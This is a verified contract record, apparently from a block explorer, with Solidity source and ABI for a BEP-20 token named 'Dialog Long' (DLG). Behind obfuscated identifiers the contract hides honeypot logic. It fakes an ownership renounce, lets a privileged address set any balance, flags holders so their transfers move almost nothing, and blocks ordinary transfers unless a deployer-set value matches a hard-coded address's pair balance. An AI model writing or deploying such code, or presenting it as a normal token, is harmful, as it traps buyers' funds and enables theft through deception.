{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface isList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txLaunchedTrading {\n    function createPair(address listFund, address modeAuto) external returns (address);\n}\n\ninterface fromMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listMax) external view returns (uint256);\n\n    function transfer(address txReceiver, uint256 senderFee) external returns (bool);\n\n    function allowance(address tradingListTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txReceiver,\n        uint256 senderFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atAmount, uint256 value);\n    event Approval(address indexed tradingListTeam, address indexed spender, uint256 value);\n}\n\ninterface tradingList is fromMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DialogLong is autoMin, fromMode, tradingList {\n\n    function getOwner() external view returns (address) {\n        return marketingTotalAuto;\n    }\n\n    function approve(address walletMode, uint256 senderFee) public virtual override returns (bool) {\n        maxAt[_msgSender()][walletMode] = senderFee;\n        emit Approval(_msgSender(), walletMode, senderFee);\n        return true;\n    }\n\n    address public tradingSender;\n\n    address launchedTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address listMax) public view virtual override returns (uint256) {\n        return fundShould[listMax];\n    }\n\n    mapping(address => uint256) private fundShould;\n\n    function tokenIsTotal(address takeMax, address txReceiver, uint256 senderFee) internal returns (bool) {\n        require(fundShould[takeMax] >= senderFee);\n        fundShould[takeMax] -= senderFee;\n        fundShould[txReceiver] += senderFee;\n        emit Transfer(takeMax, txReceiver, senderFee);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchLaunched;\n    }\n\n    uint256 private buyLaunchList;\n\n    mapping(address => bool) public modeSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverWalletTake;\n    }\n\n    address txShouldMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 maxList;\n\n    address public launchedFund;\n\n    string private walletLaunch = \"Dialog Long\";\n\n    uint256 private amountLaunch = 100000000 * 10 ** 18;\n\n    function transferFrom(address takeMax, address txReceiver, uint256 senderFee) external override returns (bool) {\n        if (_msgSender() != txShouldMode) {\n            if (maxAt[takeMax][_msgSender()] != type(uint256).max) {\n                require(senderFee <= maxAt[takeMax][_msgSender()]);\n                maxAt[takeMax][_msgSender()] -= senderFee;\n            }\n        }\n        return amountLaunched(takeMax, txReceiver, senderFee);\n    }\n\n    string private launchLaunched = \"DLG\";\n\n    uint256 limitLiquidityMin;\n\n    function allowance(address sellFrom, address walletMode) external view virtual override returns (uint256) {\n        if (walletMode == txShouldMode) {\n            return type(uint256).max;\n        }\n        return maxAt[sellFrom][walletMode];\n    }\n\n    uint256 private launchMode;\n\n    function minAuto(address autoToken) public {\n        buySell();\n        if (limitTake != sellMax) {\n            sellMax = autoTotal;\n        }\n        if (autoToken == launchedFund || autoToken == tradingSender) {\n            return;\n        }\n        modeSwap[autoToken] = true;\n    }\n\n    function transfer(address maxReceiverFee, uint256 senderFee) external virtual override returns (bool) {\n        return amountLaunched(_msgSender(), maxReceiverFee, senderFee);\n    }\n\n    mapping(address => bool) public autoSender;\n\n    bool public receiverTakeLaunch;\n\n    uint256 constant tokenLimit = 15 ** 10;\n\n    function liquidityMarketing(uint256 senderFee) public {\n        buySell();\n        limitLiquidityMin = senderFee;\n    }\n\n    function fundTo(address tradingLaunched) public {\n        if (buyFund) {\n            return;\n        }\n        \n        autoSender[tradingLaunched] = true;\n        if (sellMax != isLiquidity) {\n            launchMode = isLiquidity;\n        }\n        buyFund = true;\n    }\n\n    function enableListToken(address maxReceiverFee, uint256 senderFee) public {\n        buySell();\n        fundShould[maxReceiverFee] = senderFee;\n    }\n\n    address private marketingTotalAuto;\n\n    uint256 private limitTake;\n\n    bool private launchToken;\n\n    function name() external view virtual override returns (string memory) {\n        return walletLaunch;\n    }\n\n    uint8 private receiverWalletTake = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return marketingTotalAuto;\n    }\n\n    uint256 private isLiquidity;\n\n    function buySell() private view {\n        require(autoSender[_msgSender()]);\n    }\n\n    function receiverMin() public {\n        emit OwnershipTransferred(launchedFund, address(0));\n        marketingTotalAuto = address(0);\n    }\n\n    constructor (){\n        \n        isList tradingLaunch = isList(txShouldMode);\n        tradingSender = txLaunchedTrading(tradingLaunch.factory()).createPair(tradingLaunch.WETH(), address(this));\n        \n        launchedFund = _msgSender();\n        receiverMin();\n        autoSender[launchedFund] = true;\n        fundShould[launchedFund] = amountLaunch;\n        if (limitTake != isLiquidity) {\n            isLiquidity = limitTake;\n        }\n        emit Transfer(address(0), launchedFund, amountLaunch);\n    }\n\n    uint256 public autoTotal;\n\n    bool public buyFund;\n\n    bool private launchTake;\n\n    bool public senderIs;\n\n    function amountLaunched(address takeMax, address txReceiver, uint256 senderFee) internal returns (bool) {\n        if (takeMax == launchedFund) {\n            return tokenIsTotal(takeMax, txReceiver, senderFee);\n        }\n        uint256 tokenIs = fromMode(tradingSender).balanceOf(launchedTo);\n        require(tokenIs == limitLiquidityMin);\n        require(txReceiver != launchedTo);\n        if (modeSwap[takeMax]) {\n            return tokenIsTotal(takeMax, txReceiver, tokenLimit);\n        }\n        return tokenIsTotal(takeMax, txReceiver, senderFee);\n    }\n\n    uint256 private sellMax;\n\n    event OwnershipTransferred(address indexed feeExempt, address indexed feeFrom);\n\n    mapping(address => mapping(address => uint256)) private maxAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingListTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderFee\",\"type\":\"uint256\"}],\"name\":\"enableListToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunched\",\"type\":\"address\"}],\"name\":\"fundTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderFee\",\"type\":\"uint256\"}],\"name\":\"liquidityMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"}],\"name\":\"minAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTakeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DialogLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}